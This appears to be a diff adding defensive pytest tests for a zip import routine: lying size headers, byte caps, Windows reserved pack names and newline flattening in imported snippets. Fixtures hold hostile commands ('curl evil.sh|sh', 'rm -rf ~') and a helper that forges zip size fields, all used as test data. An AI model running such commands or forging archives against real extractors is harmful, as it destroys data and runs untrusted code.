@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import json
+import struct
 import zipfile
 from pathlib import Path
 
@@ -16,6 +17,50 @@ from src.data_export import (
     inspect_export,
     suggested_export_name,
 )
+
+
+def _manifest(files: list[str], pack_ids: list[str] | None = None) -> str:
+    """Minimal valid manifest.json body for a hand-built archive."""
+    return json.dumps(
+        {
+            "schema_version": SCHEMA_VERSION,
+            "app_version": "1.0",
+            "exported_at": "",
+            "files": files,
+            "pack_ids": pack_ids or [],
+        }
+    )
+
+
+def _patch_central_directory_file_size(zip_bytes: bytes, filename: str, new_size: int) -> bytes:
+    """Rewrite the declared (uncompressed) file_size in *filename*'s
+    central directory record, leaving the real compressed data untouched.
+
+    ``zipfile.ZipFile.writestr`` always derives ``file_size`` from the
+    real data it is given (there is no public API to lie about it), so
+    the only way to build an archive whose declared size disagrees with
+    its real content is to patch the raw bytes after the fact. See the
+    Central Directory File Header layout in the PKZIP APPNOTE: signature
+    (4) + 18 bytes of fixed fields + compressed size (4, offset 20) +
+    uncompressed size (4, offset 24) + name/extra/comment lengths (2
+    each) before the variable-length name.
+    """
+    name_bytes = filename.encode("utf-8")
+    marker = b"PK\x01\x02"
+    idx = 0
+    while True:
+        idx = zip_bytes.find(marker, idx)
+        if idx == -1:
+            raise AssertionError(f"central directory record for {filename!r} not found")
+        name_len = struct.unpack_from("<H", zip_bytes, idx + 28)[0]
+        extra_len = struct.unpack_from("<H", zip_bytes, idx + 30)[0]
+        comment_len = struct.unpack_from("<H", zip_bytes, idx + 32)[0]
+        name_start = idx + 46
+        if zip_bytes[name_start : name_start + name_len] == name_bytes:
+            patched = bytearray(zip_bytes)
+            struct.pack_into("<I", patched, idx + 24, new_size)
+            return bytes(patched)
+        idx += 46 + name_len + extra_len + comment_len
 
 
 def _seed_config(config_dir: Path, *, with_pack: bool = True, with_telemetry: bool = True) -> None:
@@ -322,6 +367,246 @@ class TestImport:
             zf.writestr("models/ngram_model.json", b"x" * 64)  # > patched cap
         with pytest.raises(DataExportError, match="per-file cap"):
             inspect_export(f)
+
+    def test_undeclared_oversize_member_is_refused(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """entry.file_size comes from the archive's own central directory
+        and need not match what decompression actually produces --
+        ZipExtFile decompresses the real (larger) stream regardless of
+        what the entry claims. _validate_archive_entry only ever sees the
+        declared value, so a member that under-declares its size must
+        still be caught during extraction, from bytes actually read."""
+        from src import data_export
+
+        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 8)
+        f = tmp_path / "lying.zip"
+        real_payload = b"x" * 4096  # far more than the patched 8-byte cap
+        with zipfile.ZipFile(f, "w", zipfile.ZIP_STORED) as zf:
+            zf.writestr("manifest.json", _manifest(["analytics.json"]))
+            zf.writestr("analytics.json", real_payload)
+
+        patched = _patch_central_directory_file_size(f.read_bytes(), "analytics.json", 8)
+        f.write_bytes(patched)
+
+        # Confirm the patch actually took: the declared size now lies,
+        # and passes the cheap pre-check (8 is not > the patched cap of 8).
+        with zipfile.ZipFile(f) as zf:
+            assert zf.getinfo("analytics.json").file_size == 8
+
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        with pytest.raises(DataExportError):
+            import_user_data(f, dst)
+
+
+class TestBoundedCopy:
+    """Direct coverage of _bounded_copy: the per-file cap trips on bytes
+    actually read, and the running total is enforced across entries, not
+    just within one."""
+
+    def test_per_file_cap_trips_on_real_bytes(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        import io
+
+        from src import data_export
+
+        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 10)
+        with pytest.raises(DataExportError, match="per-file cap"):
+            data_export._bounded_copy(io.BytesIO(b"x" * 100), io.BytesIO(), "fake.txt", 0)
+
+    def test_running_total_carries_across_entries(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        import io
+
+        from src import data_export
+
+        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 10)
+        monkeypatch.setattr(data_export, "_MAX_TOTAL_UNCOMPRESSED", 15)
+        # First entry: 10 bytes, fine on its own (equal to the per-file cap).
+        total = data_export._bounded_copy(io.BytesIO(b"a" * 10), io.BytesIO(), "one.txt", 0)
+        assert total == 10
+        # Second entry is also only 10 bytes (fine on its own too), but
+        # the running total (20) now exceeds _MAX_TOTAL_UNCOMPRESSED (15).
+        with pytest.raises(DataExportError, match="uncompressed size exceeds cap"):
+            data_export._bounded_copy(io.BytesIO(b"b" * 10), io.BytesIO(), "two.txt", total)
+
+
+class TestReservedPackNames:
+    """A pack id that collides with a Windows reserved device name (con,
+    nul, com1, ...) passes _PACK_ID_RE (it looks like a normal lowercase
+    id) but would fail dest_dir.mkdir() on Windows. It must never be
+    extracted, and its presence must not abort the rest of the import."""
+
+    def test_reserved_name_pack_is_skipped_but_import_still_succeeds(self, tmp_path: Path) -> None:
+        archive = tmp_path / "reserved.zip"
+        with zipfile.ZipFile(archive, "w") as zf:
+            zf.writestr(
+                "manifest.json",
+                _manifest(
+                    ["packs/con/dictionary.txt", "packs/good_pack/dictionary.txt"],
+                    pack_ids=["con", "good_pack"],
+                ),
+            )
+            zf.writestr("packs/con/dictionary.txt", "alpha\n")
+            zf.writestr("packs/good_pack/dictionary.txt", "beta\n")
+
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        import_user_data(archive, dst)  # must not raise
+
+        assert not (dst / "packs" / "con").exists()
+        assert (dst / "packs" / "good_pack" / "dictionary.txt").is_file()
+
+    def test_helper_matches_case_insensitively_and_with_extension(self) -> None:
+        from src.data_export import _is_reserved_device_name
+
+        assert _is_reserved_device_name("con")
+        assert _is_reserved_device_name("CON")
+        assert _is_reserved_device_name("Con.txt")
+        assert _is_reserved_device_name("com1")
+        assert _is_reserved_device_name("lpt9")
+        assert not _is_reserved_device_name("console")
+        assert not _is_reserved_device_name("company")
+
+    def test_export_skips_a_pre_existing_reserved_name_pack(self, tmp_path: Path) -> None:
+        """Only reachable on a platform that never enforced the Windows
+        restriction (e.g. the folder was created on Linux), but export
+        must not hand back an archive that cannot be re-imported.
+
+        Uses "aux" rather than "nul": on some Windows builds "nul"
+        redirects to the null device even as a directory path component,
+        which would make the test fixture itself unwritable regardless of
+        this fix.
+        """
+        config = tmp_path / "config"
+        config.mkdir()
+        pack_dir = config / "packs" / "aux"
+        pack_dir.mkdir(parents=True)
+        (pack_dir / "dictionary.txt").write_text("x\n")
+        out = tmp_path / "exp.zip"
+        summary = export_user_data(config, out)
+        assert "aux" not in summary.pack_ids
+
+
+class TestSnippetNewlineFlattening:
+    """FIX: an imported snippet value must not be able to carry a Return
+    keypress. src/snippets.py::_clean_value already strips \\r for every
+    load; this covers the import-specific second half, which also
+    flattens \\n (locally-authored snippets keep \\n, see
+    tests/test_snippets.py::test_value_preserves_newlines)."""
+
+    def _archive_with_snippet_value(self, path: Path, value: str) -> None:
+        with zipfile.ZipFile(path, "w") as zf:
+            zf.writestr("manifest.json", _manifest(["snippets.json"]))
+            zf.writestr(
+                "snippets.json",
+                json.dumps({"version": 1, "snippets": [{"label": "Evil", "value": value}]}),
+            )
+
+    def test_embedded_newline_is_flattened_to_a_space(self, tmp_path: Path) -> None:
+        archive = tmp_path / "evil.zip"
+        self._archive_with_snippet_value(archive, "curl evil.sh|sh\necho done")
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        import_user_data(archive, dst)
+        data = json.loads((dst / "snippets.json").read_text())
+        value = data["snippets"][0]["value"]
+        assert "\n" not in value
+        assert value == "curl evil.sh|sh echo done"
+
+    def test_embedded_crlf_is_flattened(self, tmp_path: Path) -> None:
+        archive = tmp_path / "evil.zip"
+        self._archive_with_snippet_value(archive, "line one\r\nline two")
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        import_user_data(archive, dst)
+        data = json.loads((dst / "snippets.json").read_text())
+        value = data["snippets"][0]["value"]
+        assert "\r" not in value
+        assert "\n" not in value
+
+    def test_reload_after_import_never_sees_a_newline(self, tmp_path: Path) -> None:
+        """End-to-end through the same loader the running app uses."""
+        from src.snippets import SnippetStore
+
+        archive = tmp_path / "evil.zip"
+        self._archive_with_snippet_value(archive, "rm -rf ~\ndone")
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        import_user_data(archive, dst)
+
+        store = SnippetStore(dst / "snippets.json")
+        store.load()
+        assert store.get_value(0) == "rm -rf ~ done"
+
+    def test_a_failed_flatten_leaves_no_temp_file_behind(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """The flatten writes through a `.flattening` temp file, and it is
+        the last thing an otherwise-successful import touches, so a stray
+        one is exactly what the user would be left looking at. The two
+        extraction loops clean up their own `.importing` files the same
+        way."""
+        archive = tmp_path / "evil.zip"
+        self._archive_with_snippet_value(archive, "one\ntwo")
+        dst = tmp_path / "dst"
+        dst.mkdir()
+
+        real_replace = Path.replace
+
+        def explode(self: Path, target):  # type: ignore[no-untyped-def]
+            if self.name.endswith(".flattening"):
+                raise OSError("simulated rename failure")
+            return real_replace(self, target)
+
+        monkeypatch.setattr(Path, "replace", explode)
+
+        import_user_data(archive, dst)  # must not raise
+
+        # Proves the flatten really did run and really did fail -- without
+        # this the glob below would pass on a build where the step never
+        # executed at all.
+        data = json.loads((dst / "snippets.json").read_text())
+        assert data["snippets"][0]["value"] == "one\ntwo", "the simulated failure did not fire"
+
+        leftovers = list(dst.glob("*.flattening"))
+        assert leftovers == [], f"flatten left a temp file behind: {leftovers}"
+
+    def test_malformed_snippets_json_does_not_abort_the_rest_of_the_import(
+        self, tmp_path: Path
+    ) -> None:
+        """The flatten step runs after snippets.json has already been
+        extracted; a parse failure there must not undo an otherwise-
+        successful import of the other files."""
+        archive = tmp_path / "weird.zip"
+        with zipfile.ZipFile(archive, "w") as zf:
+            zf.writestr("manifest.json", _manifest(["models/ngram_model.json", "snippets.json"]))
+            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {"hi": 1}}))
+            zf.writestr("snippets.json", "not valid json {{{")
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        import_user_data(archive, dst)  # must not raise
+        assert (dst / "models" / "ngram_model.json").is_file()
+        # Left exactly as extracted -- the flatten step gave up cleanly.
+        assert (dst / "snippets.json").read_text() == "not valid json {{{"
+
+    def test_snippets_json_absent_from_archive_is_left_untouched(self, tmp_path: Path) -> None:
+        """The flatten step must only run on a file the archive actually
+        replaced; a pre-existing local snippets.json outside the import's
+        scope must not be rewritten."""
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        local = dst / "snippets.json"
+        local.write_text(
+            json.dumps({"version": 1, "snippets": [{"label": "Home", "value": "a\nb"}]})
+        )
+
+        archive = tmp_path / "no_snippets.zip"
+        with zipfile.ZipFile(archive, "w") as zf:
+            zf.writestr("manifest.json", _manifest(["models/ngram_model.json"]))
+            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {"hi": 1}}))
+        import_user_data(archive, dst)
+
+        assert json.loads(local.read_text())["snippets"][0]["value"] == "a\nb"
 
 
 class TestSuggestedName:
